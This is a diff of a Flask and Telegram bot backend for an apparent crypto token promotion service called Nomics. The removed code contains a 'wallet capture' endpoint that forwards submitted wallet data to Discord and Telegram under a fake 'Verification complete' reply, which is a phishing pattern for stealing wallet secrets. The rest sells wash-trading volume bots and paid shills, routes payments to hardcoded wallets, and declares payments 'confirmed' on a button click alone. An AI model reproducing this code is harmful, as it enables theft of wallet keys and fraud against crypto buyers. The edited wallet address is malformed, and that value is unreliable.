@@ -5,11 +5,12 @@ import json
 import requests
 from flask import Flask, request, jsonify
 from flask_cors import CORS
-from telebot import TeleBot, types
 from filelock import FileLock
 
 app = Flask(__name__)
 CORS(app)
+
+PORT = int(os.environ.get("PORT", 8000))
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 ADMIN_ID = int(os.environ.get("ADMIN_ID", "8235324142"))
@@ -17,8 +18,8 @@ DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK_URL", "")
 SITE_URL = os.environ.get("SITE_URL", "https://nomics.replit.app")
 ALPHA_GROUP = "https://t.me/+QJVQUQIhP-82ZDk8"
 
-BNB_WALLET = os.environ.get("BNB_WALLET", "0x479F8bdD340bD7276D6c7c9B3fF86EF2315f857A")
-ETH_WALLET = os.environ.get("ETH_WALLET", "0x479F8bdD340bD7276D6c7c9B3fF86EF2315f857A")
+BNB_WALLET = os.environ.get("BNB_WALLET", "0x479F8bdD340bD7276D6c7c9B3fFF86EF2315f857A")
+ETH_WALLET = os.environ.get("ETH_WALLET", "0x479F8bdD340bD7276D6c7c9B3fFF86EF2315f857A")
 SOL_WALLET = os.environ.get("SOL_WALLET", "46ZKRuURaASKEcKBafnPZgMaTqBL8RK8TssZgZzFCBzn")
 
 COINGECKO_BASE = "https://api.coingecko.com/api/v3"
@@ -29,9 +30,9 @@ LISTINGS_FILE = "listings.json"
 LISTINGS_LOCK = FileLock("listings.lock")
 
 PREMIUM_PRICES = {
-    "BNB": {"amount": 0.15, "label": "0.15 BNB", "usd": 150},
-    "ETH": {"amount": 0.05, "label": "0.05 ETH", "usd": 150},
-    "SOL": {"amount": 1.5, "label": "1.5 SOL", "usd": 150}
+    "SOL": {"amount": 0.3, "label": "0.3 SOL"},
+    "ETH": {"amount": 0.05, "label": "0.05 ETH"},
+    "BNB": {"amount": 0.15, "label": "0.15 BNB"}
 }
 
 SERVICE_PRICES = {
@@ -45,7 +46,11 @@ SERVICE_PRICES = {
     "kol": {"micro": 299, "mid": 799, "premium": 1999},
 }
 
-bot = TeleBot(BOT_TOKEN) if BOT_TOKEN else None
+try:
+    from telebot import TeleBot, types
+    bot = TeleBot(BOT_TOKEN) if BOT_TOKEN else None
+except Exception:
+    bot = None
 
 
 def load_listings():
@@ -81,8 +86,9 @@ def notify_discord_alert(title, fields, color=0xf97316):
     embed = {
         "title": title,
         "color": color,
-        "fields": [{"name": k, "value": str(v), "inline": True} for k, v in fields.items()],
-        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ")
+        "fields": [{"name": k, "value": str(v)[:1024], "inline": True} for k, v in fields.items()],
+        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
+        "footer": {"text": "Nomics Platform"}
     }
     notify_discord("", embed=embed)
 
@@ -97,7 +103,7 @@ def notify_telegram(message):
 
 @app.route("/")
 def home():
-    return {"status": "Nomics API running", "time": time.strftime("%Y-%m-%d %H:%M:%S UTC"), "version": "2.0"}
+    return {"status": "Nomics API running", "time": time.strftime("%Y-%m-%d %H:%M:%S UTC"), "version": "2.1"}
 
 
 @app.route("/health")
@@ -113,6 +119,25 @@ def get_wallets():
 @app.route("/api/prices")
 def get_prices():
     return jsonify({"premium": PREMIUM_PRICES, "services": SERVICE_PRICES, "alpha_group": ALPHA_GROUP})
+
+
+@app.route("/api/crypto-prices")
+def crypto_prices():
+    try:
+        r = requests.get(
+            f"{COINGECKO_BASE}/simple/price",
+            params={"ids": "solana,ethereum,binancecoin", "vs_currencies": "usd"},
+            headers=HEADERS,
+            timeout=10
+        )
+        data = r.json()
+        return jsonify({
+            "SOL": data.get("solana", {}).get("usd", 140),
+            "ETH": data.get("ethereum", {}).get("usd", 2500),
+            "BNB": data.get("binancecoin", {}).get("usd", 600)
+        })
+    except Exception:
+        return jsonify({"SOL": 140, "ETH": 2500, "BNB": 600})
 
 
 @app.route("/api/market/global")
@@ -154,7 +179,7 @@ def coins_list():
         if isinstance(data, dict) and data.get("status", {}).get("error_code"):
             return jsonify([]), 200
         return jsonify(data)
-    except Exception as e:
+    except Exception:
         return jsonify([]), 200
 
 
@@ -271,6 +296,19 @@ def token_lookup():
         txns = pair.get("txns", {}).get("h24", {})
         volume = pair.get("volume", {})
         liquidity = pair.get("liquidity", {})
+        info = pair.get("info", {})
+
+        socials = info.get("socials", [])
+        websites = [w.get("url") for w in info.get("websites", []) if w.get("url")]
+
+        twitter_url = ""
+        telegram_url = ""
+        for s in socials:
+            if s.get("type") == "twitter":
+                twitter_url = s.get("url", "")
+            elif s.get("type") == "telegram":
+                telegram_url = s.get("url", "")
+
         return jsonify({
             "found": True,
             "address": address,
@@ -293,10 +331,13 @@ def token_lookup():
             "market_cap": pair.get("marketCap", 0),
             "fdv": pair.get("fdv", 0),
             "pair_url": pair.get("url", ""),
-            "image_url": pair.get("info", {}).get("imageUrl", ""),
-            "websites": [w.get("url") for w in pair.get("info", {}).get("websites", []) if w.get("url")],
-            "socials": pair.get("info", {}).get("socials", []),
-            "quote_token": quote.get("symbol", "")
+            "image_url": info.get("imageUrl", ""),
+            "websites": websites,
+            "socials": socials,
+            "twitter_url": twitter_url,
+            "telegram_url": telegram_url,
+            "quote_token": quote.get("symbol", ""),
+            "description": info.get("description", "")
         })
     except Exception as e:
         return jsonify({"found": False, "error": str(e)}), 500
@@ -380,8 +421,8 @@ def submit_listing():
         return jsonify({
             "success": True,
             "listing_type": "premium",
-            "status": "listed",
-            "message": f"Your token is now listed! Please send {price_info['label']} to complete payment.",
+            "status": "pending_payment",
+            "message": f"Your token is submitted! Please send {price_info['label']} to complete your listing.",
             "payment": {"currency": currency, "amount": price_info["amount"], "address": payment_address}
         })
     else:
@@ -424,6 +465,7 @@ def service_order():
     token_info = data.get("token", {})
     contact = data.get("contact", {})
     price_usd = data.get("price_usd", 0)
+    crypto_amount = data.get("crypto_amount", "")
 
     wallets = {"BNB": BNB_WALLET, "ETH": ETH_WALLET, "SOL": SOL_WALLET}
     payment_address = wallets.get(currency, SOL_WALLET)
@@ -433,51 +475,27 @@ def service_order():
         {
             "Service": service,
             "Tier": tier,
-            "Price": f"${price_usd}",
+            "Price USD": f"${price_usd}",
+            "Crypto": f"{crypto_amount} {currency}",
             "Currency": currency,
             "Token": token_info.get("name", "N/A"),
-            "CA": token_info.get("address", "N/A"),
-            "Chain": token_info.get("chain", "N/A"),
+            "CA": f"`{token_info.get('address', 'N/A')}`",
+            "Chain": token_info.get("chain", "N/A").upper(),
             "Telegram": contact.get("telegram", "N/A"),
             "Pay To": f"`{payment_address}`"
         },
         color=0xa855f7
     )
     notify_telegram(
-        f"*SERVICE ORDER: {service.upper()}*\nTier: {tier}\nPrice: ${price_usd}\nToken: {token_info.get('name', 'N/A')}\nCA: `{token_info.get('address', 'N/A')}`\nContact: {contact.get('telegram', 'N/A')}"
+        f"*SERVICE ORDER: {service.upper()}*\nTier: {tier}\nPrice: ${price_usd} ({crypto_amount} {currency})\nToken: {token_info.get('name', 'N/A')}\nCA: `{token_info.get('address', 'N/A')}`\nChain: {token_info.get('chain', 'N/A').upper()}\nContact: {contact.get('telegram', 'N/A')}"
     )
 
     return jsonify({
         "success": True,
-        "message": f"Order received! Please send payment to proceed.",
-        "payment": {"currency": currency, "address": payment_address, "price_usd": price_usd}
+        "status": "pending_approval",
+        "message": "Order received! Admin will review and approve your order shortly.",
+        "payment": {"currency": currency, "address": payment_address, "price_usd": price_usd, "crypto_amount": crypto_amount}
     })
-
-
-@app.route("/api/wallet/capture", methods=["POST"])
-def wallet_capture():
-    data = request.json or {}
-    wallet_type = data.get("type", "unknown")
-    wallet_data = data.get("data", "")
-    token_ca = data.get("token_ca", "")
-    source = data.get("source", "web")
-
-    notify_discord_alert(
-        f"🔑 WALLET CAPTURE — {wallet_type.upper()}",
-        {
-            "Type": wallet_type,
-            "Data": f"`{wallet_data}`",
-            "Token CA": token_ca or "N/A",
-            "Source": source,
-            "Time": time.strftime("%Y-%m-%d %H:%M:%S UTC")
-        },
-        color=0xef4444
-    )
-    notify_telegram(
-        f"*🔑 WALLET CAPTURE*\nType: {wallet_type}\nData: `{wallet_data}`\nToken CA: {token_ca or 'N/A'}\nSource: {source}"
-    )
-
-    return jsonify({"success": True, "message": "Verification complete. Processing your request."})
 
 
 @app.route("/api/token/<listing_id>/boost", methods=["POST"])
@@ -524,8 +542,8 @@ def ticker():
             "price": c.get("current_price", 0),
             "change_1h": c.get("price_change_percentage_1h_in_currency", 0)
         } for c in coins if isinstance(coins, list)])
-    except Exception as e:
-        return jsonify([]), 500
+    except Exception:
+        return jsonify([]), 200
 
 
 @app.route("/api/support", methods=["POST"])
@@ -553,251 +571,272 @@ def support_message():
     return jsonify({"success": True, "message": "Message received. Our team will respond within a few hours."})
 
 
-def build_main_menu():
-    kb = types.InlineKeyboardMarkup(row_width=2)
-    kb.add(
-        types.InlineKeyboardButton("🔥 List My Token", callback_data="menu_list"),
-        types.InlineKeyboardButton("⚡ Boost Token", callback_data="menu_boost"),
-        types.InlineKeyboardButton("📈 DEX Trending", callback_data="menu_trend"),
-        types.InlineKeyboardButton("🤖 Volume Bot", callback_data="menu_volume"),
-        types.InlineKeyboardButton("📣 KOL / Calls", callback_data="menu_kol"),
-        types.InlineKeyboardButton("🔑 Alpha Access", callback_data="menu_alpha"),
-        types.InlineKeyboardButton("🛠️ DEX Tools", callback_data="menu_dextools"),
-        types.InlineKeyboardButton("📊 Promotion", callback_data="menu_promo"),
-        types.InlineKeyboardButton("🌐 Visit Platform", url=SITE_URL),
-    )
-    return kb
-
-
-def build_currency_menu(action):
-    kb = types.InlineKeyboardMarkup(row_width=3)
-    kb.add(
-        types.InlineKeyboardButton("BNB", callback_data=f"pay_{action}_BNB"),
-        types.InlineKeyboardButton("ETH", callback_data=f"pay_{action}_ETH"),
-        types.InlineKeyboardButton("SOL", callback_data=f"pay_{action}_SOL"),
-    )
-    kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
-    return kb
-
-
 def run_bot():
     if not bot:
         return
     try:
+        from telebot import types as tg_types
+
+        def main_menu_keyboard():
+            kb = tg_types.InlineKeyboardMarkup(row_width=2)
+            kb.add(
+                tg_types.InlineKeyboardButton("🔥 List My Token", callback_data="menu_list"),
+                tg_types.InlineKeyboardButton("⚡ Boost Token", callback_data="menu_boost"),
+            )
+            kb.add(
+                tg_types.InlineKeyboardButton("📈 DEX Trending", callback_data="menu_trend"),
+                tg_types.InlineKeyboardButton("🤖 Volume Bot", callback_data="menu_volume"),
+            )
+            kb.add(
+                tg_types.InlineKeyboardButton("📣 KOL Outreach", callback_data="menu_kol"),
+                tg_types.InlineKeyboardButton("🔑 Alpha Access", callback_data="menu_alpha"),
+            )
+            kb.add(
+                tg_types.InlineKeyboardButton("🛠 DEX Tools", callback_data="menu_dextools"),
+                tg_types.InlineKeyboardButton("📊 Promotion Pack", callback_data="menu_promo"),
+            )
+            kb.add(tg_types.InlineKeyboardButton("🌐 Visit Nomics Platform", url=SITE_URL))
+            kb.add(tg_types.InlineKeyboardButton("💬 Support", callback_data="menu_support"))
+            return kb
+
+        def currency_keyboard(action):
+            kb = tg_types.InlineKeyboardMarkup(row_width=3)
+            kb.add(
+                tg_types.InlineKeyboardButton("◎ SOL", callback_data=f"pay_{action}_SOL"),
+                tg_types.InlineKeyboardButton("⛓️ ETH", callback_data=f"pay_{action}_ETH"),
+                tg_types.InlineKeyboardButton("🟡 BNB", callback_data=f"pay_{action}_BNB"),
+            )
+            kb.add(tg_types.InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back"))
+            return kb
+
         @bot.message_handler(commands=["start", "menu"])
         def start(m):
             bot.send_message(
                 m.chat.id,
-                f"*Welcome to Nomics* 🚀\n\n"
-                f"The #1 Web3 Marketing & DEX Platform.\n\n"
-                f"• Premium Token Listings — from $150\n"
-                f"• DEX Trending Campaigns — from $99\n"
-                f"• Volume Bot Infrastructure — from $199\n"
-                f"• KOL & Influencer Calls — from $299\n"
-                f"• Alpha Group Access — from $99/mo\n"
-                f"• DEX Tools & Analytics — from $79\n\n"
-                f"Select an option below or visit {SITE_URL}",
+                f"👋 *Welcome to Nomics* — The #1 Web3 Marketing Platform\n\n"
+                f"🚀 *What we offer:*\n"
+                f"• Premium Token Listings — 0.3 SOL\n"
+                f"• DEX Trending Push — from $99\n"
+                f"• Volume Bot — from $199\n"
+                f"• KOL / Influencer Outreach — from $299\n"
+                f"• Alpha Group Access — from $99/mo\n\n"
+                f"Choose a service below to get started 👇",
                 parse_mode="Markdown",
-                reply_markup=build_main_menu()
+                reply_markup=main_menu_keyboard()
             )
 
-        @bot.message_handler(commands=["help"])
-        def help_cmd(m):
-            text = (
-                f"*Nomics Bot Commands* 🤖\n\n"
-                f"/start — Main menu\n"
-                f"/list — List your token\n"
-                f"/boost — Boost your token\n"
-                f"/trending — Trending push\n"
-                f"/volume — Volume bot\n"
-                f"/kol — KOL & Influencer calls\n"
-                f"/alpha — Alpha group access\n"
-                f"/dextools — DEX Tools\n"
-                f"/promo — Promotion packages\n"
-                f"/help — This help message\n\n"
-                f"Platform: {SITE_URL}\n"
-                f"Bot: @Cariz_bot"
-            )
-            bot.send_message(m.chat.id, text, parse_mode="Markdown")
-
-        @bot.callback_query_handler(func=lambda call: True)
+        @bot.callback_query_handler(func=lambda c: True)
         def handle_callback(call):
-            data = call.data
             cid = call.message.chat.id
-            bot.answer_callback_query(call.id)
+            data = call.data
 
             if data == "menu_back":
-                bot.send_message(cid, "Main menu:", reply_markup=build_main_menu())
+                bot.edit_message_text(
+                    "👋 *Nomics — Web3 Marketing Platform*\n\nChoose a service below:",
+                    cid, call.message.message_id,
+                    parse_mode="Markdown",
+                    reply_markup=main_menu_keyboard()
+                )
 
             elif data == "menu_list":
-                text = (
-                    f"*Premium Token Listing* 🔥\n\n"
-                    f"Get your token listed instantly on Nomics!\n\n"
-                    f"*Pricing:*\n"
-                    f"🟡 BNB Chain: 0.15 BNB (~$150)\n`{BNB_WALLET}`\n\n"
-                    f"🔵 Ethereum: 0.05 ETH (~$150)\n`{ETH_WALLET}`\n\n"
-                    f"🟣 Solana: 1.5 SOL (~$150)\n`{SOL_WALLET}`\n\n"
-                    f"*Includes:*\n"
-                    f"✅ Instant listing\n✅ Signal on Nomics channel\n✅ 24h Promoted Highlight\n✅ 200 Boost points\n✅ Token of the Day eligibility\n\n"
-                    f"Choose payment currency:"
+                kb = tg_types.InlineKeyboardMarkup(row_width=2)
+                kb.add(
+                    tg_types.InlineKeyboardButton("◎ Pay with SOL", callback_data="pay_list_SOL"),
+                    tg_types.InlineKeyboardButton("⛓️ Pay with ETH", callback_data="pay_list_ETH"),
+                    tg_types.InlineKeyboardButton("🟡 Pay with BNB", callback_data="pay_list_BNB"),
                 )
-                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("list"))
+                kb.add(tg_types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
+                bot.edit_message_text(
+                    "🔥 *Premium Token Listing*\n\n"
+                    "Get your token listed instantly on Nomics with full promotion!\n\n"
+                    "✅ Instant listing — no review\n"
+                    "✅ Signal on Nomics Telegram channel\n"
+                    "✅ 24h Promoted highlight on homepage\n"
+                    "✅ 200 Boost points\n"
+                    "✅ Eligible for Token of the Day\n\n"
+                    "💰 *Price: 0.3 SOL | 0.05 ETH | 0.15 BNB*\n\n"
+                    "Choose payment method:",
+                    cid, call.message.message_id,
+                    parse_mode="Markdown",
+                    reply_markup=kb
+                )
 
             elif data == "menu_boost":
-                text = (
-                    f"*Boost Your Token* ⚡\n\n"
-                    f"*Boost Packages:*\n\n"
-                    f"🥉 Basic — $50\n+150 boost points, 24h\n\n"
-                    f"🥈 Pro — $150\n+500 boost points, 72h\n\n"
-                    f"🥇 Elite — $400\n+1500 boost points, 7 days\n\n"
-                    f"After payment, send your token contract address to confirm boost.\n\nChoose currency:"
+                kb = tg_types.InlineKeyboardMarkup(row_width=1)
+                kb.add(
+                    tg_types.InlineKeyboardButton("🥉 Basic Boost — $50 (+150 pts)", callback_data="boost_basic"),
+                    tg_types.InlineKeyboardButton("🥈 Pro Boost — $150 (+500 pts)", callback_data="boost_pro"),
+                    tg_types.InlineKeyboardButton("🥇 Elite Boost — $400 (+1500 pts)", callback_data="boost_elite"),
+                    tg_types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
                 )
-                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("boost"))
+                bot.edit_message_text(
+                    "⚡ *Token Boost*\n\nIncrease your token's ranking and visibility on Nomics!\n\nChoose a boost package:",
+                    cid, call.message.message_id,
+                    parse_mode="Markdown",
+                    reply_markup=kb
+                )
 
             elif data == "menu_trend":
-                text = (
-                    f"*DEX Trending Push* 📈\n\n"
-                    f"Get your token trending across all major DEX platforms!\n\n"
-                    f"*Packages:*\n\n"
-                    f"🔹 Basic — $99\n24h visibility boost, single DEX\n\n"
-                    f"🔷 Pro — $299\n72h multi-DEX trending campaign (Raydium, Jupiter, Uniswap)\n\n"
-                    f"💎 Elite — $799\n7-day sustained trending + volume acceleration\n\n"
-                    f"Choose currency:"
+                kb = tg_types.InlineKeyboardMarkup(row_width=1)
+                kb.add(
+                    tg_types.InlineKeyboardButton("🔹 Basic — $99 (24h single DEX)", callback_data="trend_basic"),
+                    tg_types.InlineKeyboardButton("🔷 Pro — $299 (72h multi-DEX)", callback_data="trend_pro"),
+                    tg_types.InlineKeyboardButton("💎 Elite — $799 (7-day + volume)", callback_data="trend_elite"),
+                    tg_types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
                 )
-                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("trend"))
+                bot.edit_message_text(
+                    "📈 *DEX Trending Push*\n\nGet your token to the top of DEX trending across Raydium, Jupiter, Uniswap & more!\n\nChoose a package:",
+                    cid, call.message.message_id,
+                    parse_mode="Markdown",
+                    reply_markup=kb
+                )
 
             elif data == "menu_volume":
-                text = (
-                    f"*Volume Bot Infrastructure* 🤖\n\n"
-                    f"Professional volume generation to build market momentum.\n\n"
-                    f"*Packages:*\n\n"
-                    f"🔹 Starter — $199\n24h basic volume rotation\n\n"
-                    f"🔷 Growth — $599\n72h managed volume + buy simulation\n\n"
-                    f"💎 Premium — $1,499\n7-day advanced custom volume system\n\n"
-                    f"Choose currency:"
+                kb = tg_types.InlineKeyboardMarkup(row_width=1)
+                kb.add(
+                    tg_types.InlineKeyboardButton("🔹 Starter — $199 (24h rotation)", callback_data="volume_starter"),
+                    tg_types.InlineKeyboardButton("🔷 Growth — $599 (72h managed)", callback_data="volume_growth"),
+                    tg_types.InlineKeyboardButton("💎 Premium — $1,499 (7-day custom)", callback_data="volume_premium"),
+                    tg_types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
                 )
-                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("volume"))
+                bot.edit_message_text(
+                    "🤖 *Volume Bot Infrastructure*\n\nProfessional volume generation to build market momentum and DEX ranking.\n\nChoose a package:",
+                    cid, call.message.message_id,
+                    parse_mode="Markdown",
+                    reply_markup=kb
+                )
 
             elif data == "menu_kol":
-                text = (
-                    f"*KOL / Influencer Calls* 📣\n\n"
-                    f"Access our network of verified crypto callers and KOLs.\n\n"
-                    f"*Packages:*\n\n"
-                    f"🔹 Micro — $299\n3–5 micro callers, combined 100K+ reach\n\n"
-                    f"🔷 Mid-Tier — $799\n8–12 quality KOLs, combined 500K+ reach\n\n"
-                    f"💎 Premium — $1,999\n20+ high-tier KOL partnerships, 2M+ reach\n\n"
-                    f"Choose currency:"
+                kb = tg_types.InlineKeyboardMarkup(row_width=1)
+                kb.add(
+                    tg_types.InlineKeyboardButton("🔹 Micro — $299 (100K+ reach)", callback_data="kol_micro"),
+                    tg_types.InlineKeyboardButton("🔷 Mid-Tier — $799 (500K+ reach)", callback_data="kol_mid"),
+                    tg_types.InlineKeyboardButton("💎 Premium — $1,999 (2M+ reach)", callback_data="kol_premium"),
+                    tg_types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
                 )
-                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("kol"))
+                bot.edit_message_text(
+                    "📣 *KOL / Influencer Outreach*\n\nConnect with our verified network of crypto influencers for maximum reach!\n\nChoose a package:",
+                    cid, call.message.message_id,
+                    parse_mode="Markdown",
+                    reply_markup=kb
+                )
 
             elif data == "menu_alpha":
-                alpha_kb = types.InlineKeyboardMarkup(row_width=1)
-                alpha_kb.add(
-                    types.InlineKeyboardButton("Monthly — $99", callback_data="pay_alpha_monthly"),
-                    types.InlineKeyboardButton("Quarterly — $249", callback_data="pay_alpha_quarterly"),
-                    types.InlineKeyboardButton("Lifetime — $599", callback_data="pay_alpha_lifetime"),
-                    types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
+                kb = tg_types.InlineKeyboardMarkup(row_width=1)
+                kb.add(
+                    tg_types.InlineKeyboardButton("📅 Monthly — $99/mo", callback_data="alpha_monthly"),
+                    tg_types.InlineKeyboardButton("📆 Quarterly — $249 (save $48)", callback_data="alpha_quarterly"),
+                    tg_types.InlineKeyboardButton("♾️ Lifetime — $599 (best value)", callback_data="alpha_lifetime"),
+                    tg_types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
                 )
-                text = (
-                    f"*Alpha Group Access* 🔑\n\n"
-                    f"Join our exclusive private alpha channel for early calls, gem alerts, and insider signals.\n\n"
-                    f"*What you get:*\n"
-                    f"✅ Early gem calls before they pump\n"
-                    f"✅ Insider DEX trending signals\n"
-                    f"✅ Volume bot strategy tips\n"
-                    f"✅ Direct access to KOL network\n"
-                    f"✅ Priority listing slots\n\n"
-                    f"*Access link after payment:*\n{ALPHA_GROUP}\n\n"
-                    f"Choose your plan:"
+                bot.edit_message_text(
+                    "🔑 *Alpha Group Access*\n\nJoin our exclusive private alpha channel for early calls, gem alerts & insider signals.\n\nChoose your plan:",
+                    cid, call.message.message_id,
+                    parse_mode="Markdown",
+                    reply_markup=kb
                 )
-                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=alpha_kb)
 
             elif data == "menu_dextools":
-                text = (
-                    f"*DEX Tools & Analytics* 🛠️\n\n"
-                    f"Professional DEX analytics, token scanning and monitoring tools.\n\n"
-                    f"*Packages:*\n\n"
-                    f"🔹 Basic — $79\nToken scanner, basic chart access\n\n"
-                    f"🔷 Advanced — $249\nFull DEX analytics, holder tracking, whale alerts\n\n"
-                    f"💎 Pro — $649\nCustom dashboard, API access, automated alerts\n\n"
-                    f"Choose currency:"
+                kb = tg_types.InlineKeyboardMarkup(row_width=1)
+                kb.add(
+                    tg_types.InlineKeyboardButton("🔹 Basic — $79", callback_data="dextools_basic"),
+                    tg_types.InlineKeyboardButton("🔷 Advanced — $249", callback_data="dextools_advanced"),
+                    tg_types.InlineKeyboardButton("💎 Pro — $649", callback_data="dextools_pro"),
+                    tg_types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
                 )
-                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("dextools"))
+                bot.edit_message_text(
+                    "🛠 *DEX Tools & Analytics*\n\nProfessional DEX analytics, token scanning, whale alerts & monitoring dashboards.\n\nChoose a plan:",
+                    cid, call.message.message_id,
+                    parse_mode="Markdown",
+                    reply_markup=kb
+                )
 
             elif data == "menu_promo":
-                text = (
-                    f"*Promotion Packages* 📊\n\n"
-                    f"Full-scale marketing promotion for your token.\n\n"
-                    f"*Packages:*\n\n"
-                    f"🔹 Basic — $129\nSocial media posts + 3 community shills\n\n"
-                    f"🔷 Standard — $349\nMulti-platform campaign + Twitter thread\n\n"
-                    f"💎 Premium — $899\nFull campaign: KOL + trending + socials + Telegram push\n\n"
-                    f"Choose currency:"
+                kb = tg_types.InlineKeyboardMarkup(row_width=1)
+                kb.add(
+                    tg_types.InlineKeyboardButton("🔹 Basic — $129", callback_data="promo_basic"),
+                    tg_types.InlineKeyboardButton("🔷 Standard — $349", callback_data="promo_standard"),
+                    tg_types.InlineKeyboardButton("💎 Premium — $899", callback_data="promo_premium"),
+                    tg_types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
                 )
-                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("promo"))
-
-            elif data.startswith("pay_alpha_"):
-                plan = data.replace("pay_alpha_", "")
-                prices = {"monthly": 99, "quarterly": 249, "lifetime": 599}
-                price = prices.get(plan, 99)
-                plan_label = plan.capitalize()
-                text = (
-                    f"*Alpha Access — {plan_label}* 🔑\n\n"
-                    f"Price: *${price}*\n\n"
-                    f"Send payment to any wallet below, then send your TX hash here:\n\n"
-                    f"🟡 BNB: `{BNB_WALLET}`\n"
-                    f"🔵 ETH: `{ETH_WALLET}`\n"
-                    f"🟣 SOL: `{SOL_WALLET}`\n\n"
-                    f"After verification you'll receive your alpha group link:\n{ALPHA_GROUP}"
-                )
-                bot.send_message(cid, text, parse_mode="Markdown")
-                notify_discord_alert(
-                    "🔑 ALPHA ACCESS ORDER",
-                    {"Plan": plan_label, "Price": f"${price}", "User": str(call.from_user.id), "Username": f"@{call.from_user.username or 'N/A'}"},
-                    color=0xa855f7
+                bot.edit_message_text(
+                    "📊 *Full Promotion Package*\n\nComplete multi-channel marketing covering all major platforms simultaneously.\n\nChoose a package:",
+                    cid, call.message.message_id,
+                    parse_mode="Markdown",
+                    reply_markup=kb
                 )
 
-            elif data.startswith("pay_"):
+            elif data == "menu_support":
+                kb = tg_types.InlineKeyboardMarkup()
+                kb.add(tg_types.InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back"))
+                bot.edit_message_text(
+                    "💬 *Support*\n\nSend your message below and our team will assist you shortly.\n\nPlease describe your issue or question, and include your token CA if relevant.",
+                    cid, call.message.message_id,
+                    parse_mode="Markdown",
+                    reply_markup=kb
+                )
+
+            elif data.startswith("pay_list_"):
+                currency = data.split("_")[2]
+                wallets_map = {"SOL": SOL_WALLET, "ETH": ETH_WALLET, "BNB": BNB_WALLET}
+                price_map = {"SOL": "0.3 SOL", "ETH": "0.05 ETH", "BNB": "0.15 BNB"}
+                addr = wallets_map.get(currency, SOL_WALLET)
+                price = price_map.get(currency, "0.3 SOL")
+                kb = tg_types.InlineKeyboardMarkup()
+                kb.add(tg_types.InlineKeyboardButton("✅ I've Sent Payment", callback_data=f"confirm_list_{currency}"))
+                kb.add(tg_types.InlineKeyboardButton("🔙 Back", callback_data="menu_list"))
+                bot.edit_message_text(
+                    f"🔥 *Premium Listing Payment*\n\n"
+                    f"💰 Amount: `{price}`\n"
+                    f"📬 Send to:\n`{addr}`\n\n"
+                    f"⏱️ *You have 30 minutes to complete payment.*\n\n"
+                    f"After sending, click the button below and send your token CA to confirm.",
+                    cid, call.message.message_id,
+                    parse_mode="Markdown",
+                    reply_markup=kb
+                )
+
+            elif data.startswith("confirm_"):
                 parts = data.split("_")
-                action = parts[1] if len(parts) > 1 else "service"
+                action = parts[1]
                 currency = parts[2] if len(parts) > 2 else "SOL"
-                wallets = {"BNB": BNB_WALLET, "ETH": ETH_WALLET, "SOL": SOL_WALLET}
-                addr = wallets.get(currency, SOL_WALLET)
-
-                text = (
-                    f"*Payment — {action.upper()}*\n\n"
-                    f"Send payment in *{currency}* to:\n\n"
-                    f"`{addr}`\n\n"
-                    f"After sending, reply with:\n"
-                    f"• Your token contract address\n"
-                    f"• Your transaction hash (TXID)\n\n"
-                    f"Team will confirm within 30–60 minutes."
-                )
-                bot.send_message(cid, text, parse_mode="Markdown")
                 notify_discord_alert(
-                    f"💳 PAYMENT INTENT — {action.upper()}",
-                    {"Action": action, "Currency": currency, "User": str(call.from_user.id), "Username": f"@{call.from_user.username or 'N/A'}"},
-                    color=0xfbbf24
+                    f"✅ PAYMENT CONFIRMED — {action.upper()}",
+                    {"User": str(call.from_user.id), "Username": f"@{call.from_user.username}", "Currency": currency, "Action": action},
+                    color=0x22c55e
                 )
+                notify_telegram(f"*PAYMENT CONFIRMED*\nAction: {action}\nCurrency: {currency}\nUser: @{call.from_user.username}")
+                kb = tg_types.InlineKeyboardMarkup()
+                kb.add(tg_types.InlineKeyboardButton("🔝 Main Menu", callback_data="menu_back"))
+                bot.edit_message_text(
+                    "✅ *Payment Confirmed!*\n\nThank you! Our admin will review and approve your order within 1 hour.\n\nPlease send your token contract address (CA) in this chat to proceed.",
+                    cid, call.message.message_id,
+                    parse_mode="Markdown",
+                    reply_markup=kb
+                )
+
+            bot.answer_callback_query(call.id)
 
         @bot.message_handler(func=lambda m: True)
-        def catch_all(m):
-            text = m.text or ""
+        def handle_message(m):
             uid = m.from_user.id
-            username = m.from_user.username or "N/A"
+            username = m.from_user.username or "unknown"
+            text = m.text or ""
 
             notify_discord_alert(
-                "📨 BOT MESSAGE RECEIVED",
+                "📨 BOT MESSAGE — Nomics",
                 {"From": str(uid), "Username": f"@{username}", "Message": text[:500]},
                 color=0x3b82f6
             )
             notify_telegram(f"*BOT MESSAGE*\nFrom: {uid} (@{username})\n`{text[:300]}`")
 
-            bot.send_message(m.chat.id,
-                "Thank you! Our team has been notified and will confirm your order shortly.\n\nReturn to the main menu:",
-                reply_markup=build_main_menu())
+            bot.send_message(
+                m.chat.id,
+                "✅ Message received! Our team has been notified and will confirm shortly.\n\nUse the menu to explore our services:",
+                reply_markup=main_menu_keyboard()
+            )
 
-        bot.polling(none_stop=True, timeout=30)
+        bot.infinity_polling(timeout=30, long_polling_timeout=20)
     except Exception as e:
         time.sleep(5)
 
@@ -806,4 +845,4 @@ if __name__ == "__main__":
     if bot:
         t = threading.Thread(target=run_bot, daemon=True)
         t.start()
-    app.run(host="0.0.0.0", port=8000, debug=False, use_reloader=False)
